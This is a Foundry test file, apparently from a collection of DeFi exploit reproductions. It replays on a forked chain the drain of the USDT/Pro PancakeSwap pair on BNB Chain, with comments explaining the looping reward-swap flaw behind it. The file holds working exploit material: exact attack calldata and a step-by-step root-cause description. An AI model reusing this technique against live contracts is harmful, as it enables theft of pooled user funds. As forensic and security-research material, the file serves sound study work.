// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Pro Token (CryptoDAO / CDAO ecosystem) — reward-swap self-dealing drain on BNB Chain
// ~605K USDT drained from the USDT/Pro PancakeSwap LP in this single tx (the incident's
// ~$8.2M is the cumulative total across ~13 such transactions).
//
// Exploit tx : 0xaaea183bdb5d7e4fd3c8da1d5bfe7edcb2e1db2458cef9a3adac54db6a7793d1 (block 112654014)
//   Direct CALL (non-empty `to`): the attacker EOA calls its own already-deployed helper
//   contract 0xf00b... with selector 0x452ae331. The whole loop runs inside that helper.
//
// Root cause (reproducible contract mechanism, not a key compromise):
//   The Pro token's transfer logic auto-processes a "reward" on transfers involving its
//   registered player/holder addresses: it skims a 2.5% cut, then swaps the remainder of the
//   moved Pro into USDT through the USDT/Pro pair and forwards that USDT straight to a
//   "winner" address. The winner is one of the attacker-controlled addresses. By looping a
//   dust Pro transfer out of an attacker "player" clone (CLONE_A) ~300 times, the helper
//   repeatedly triggers the reward swap, each pass shipping ~2,016 USDT out of the pair to a
//   rotating trio of attacker "winner" addresses until the pair's USDT reserve is drained.
//   Nothing here is privileged — any address can register as a player and drive the loop.
//
// Pro token   : 0x8D65744527f55d0b2338350912d5C99A81ddF0e2 ("Pro Token")
// USDT/Pro LP : 0x63844BD4BFad910B1643713302a1cC1ed20d50c3 (victim, PancakeSwap pair, drained)
// USDT        : 0x55d398326f99059fF775485246999027B3197955 (18 decimals on BSC)
// Attacker EOA: 0x427671b2C8e91034A91FE698F9B7259b2345F45D
// Helper      : 0xf00bC28D22d71Be74Bc8aB0d11Fe77F6D77850ac (attacker contract, on-chain)
// Winners     : 0x4e94c21C.., 0xD9c854ED.., 0xc3994bFF.. (attacker-controlled, hold the USDT)
//
// Forensic replay: the helper contract, the player clones and the winner addresses all already
// exist on-chain at the fork block, so the faithful reproduction is to re-issue the exact
// original calldata against the deployed helper, pranking the attacker EOA as both msg.sender
// and tx.origin. The calldata is hardcoded below (no env vars).
//
// Run:
//   forge test --contracts ./src/test/2026-07/ProToken_exp.sol -vvv
//   (add `--evm-version cancun` if you hit a frameless [NotActivated] EvmError)
//   Requires an ARCHIVE BSC RPC mapped to the `bsc` rpc alias.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract ProTokenExp is Test {
    address constant ATTACKER = 0x427671b2C8e91034A91FE698F9B7259b2345F45D;
    address constant HELPER = 0xf00bC28D22d71Be74Bc8aB0d11Fe77F6D77850ac;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant PRO = 0x8D65744527f55d0b2338350912d5C99A81ddF0e2;
    address constant VICTIM_LP = 0x63844BD4BFad910B1643713302a1cC1ed20d50c3; // USDT/Pro pair

    // Attacker-controlled "winner" addresses that receive the swapped USDT.
    address constant WINNER_1 = 0x4e94c21CD9d262f3D0d0Ef143Fae38b071da38af;
    address constant WINNER_2 = 0xD9c854EDC2680D55C4dC7c601510AedC3d7F7252;
    address constant WINNER_3 = 0xc3994bfFb5410D79Fd63f7D8761A72204F780369;

    uint256 constant EXPLOIT_BLOCK = 112_654_014;

    // Exact original tx calldata: selector 0x452ae331 with
    //   (player=0xc44f2acc.. , 351841759596876665165 , 14702009000000)
    bytes constant EXPLOIT_CALLDATA =
        hex"452ae331000000000000000000000000c44f2accac20598a3f2b4d489a970fcf52a04a3c00000000000000000000000000000000000000000000001312c908374038114d00000000000000000000000000000000000000000000000000000d5f14062040";

    function setUp() public {
        // Fork one block before the exploit so the USDT/Pro LP reserves are pre-attack.
        vm.createSelectFork("bsc", EXPLOIT_BLOCK - 1);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(HELPER, "AttackerHelper");
        vm.label(USDT, "USDT");
        vm.label(PRO, "Pro");
        vm.label(VICTIM_LP, "USDT/Pro_LP");
    }

    function testExploit() public {
        uint256 lpPre = IERC20(USDT).balanceOf(VICTIM_LP);
        uint256 w1Pre = IERC20(USDT).balanceOf(WINNER_1);
        uint256 w2Pre = IERC20(USDT).balanceOf(WINNER_2);
        uint256 w3Pre = IERC20(USDT).balanceOf(WINNER_3);
        emit log_named_decimal_uint("Victim LP USDT before", lpPre, 18);

        // Replay the attack exactly: attacker EOA calls its helper with the original calldata.
        vm.prank(ATTACKER, ATTACKER); // msg.sender AND tx.origin = attacker EOA
        (bool ok,) = HELPER.call(EXPLOIT_CALLDATA);
        require(ok, "helper call reverted");

        uint256 lpPost = IERC20(USDT).balanceOf(VICTIM_LP);
        uint256 w1Gain = IERC20(USDT).balanceOf(WINNER_1) - w1Pre;
        uint256 w2Gain = IERC20(USDT).balanceOf(WINNER_2) - w2Pre;
        uint256 w3Gain = IERC20(USDT).balanceOf(WINNER_3) - w3Pre;
        uint256 winnersGain = w1Gain + w2Gain + w3Gain;

        emit log_named_decimal_uint("Victim LP USDT after ", lpPost, 18);
        emit log_named_decimal_uint("LP USDT drained      ", lpPre - lpPost, 18);
        emit log_named_decimal_uint("Winner1 USDT gain    ", w1Gain, 18);
        emit log_named_decimal_uint("Winner2 USDT gain    ", w2Gain, 18);
        emit log_named_decimal_uint("Winner3 USDT gain    ", w3Gain, 18);
        emit log_named_decimal_uint("Winners total gain   ", winnersGain, 18);

        // The three winner addresses net ~604,888 USDT drained straight out of the pair.
        assertApproxEqAbs(winnersGain, 604_888 ether, 2_000 ether, "unexpected winners USDT gain");
        // Pair USDT reserve loss matches the payout (plus a small attacker-EOA remainder).
        assertGe(lpPre - lpPost, 604_000 ether, "LP not drained as expected");
    }
}
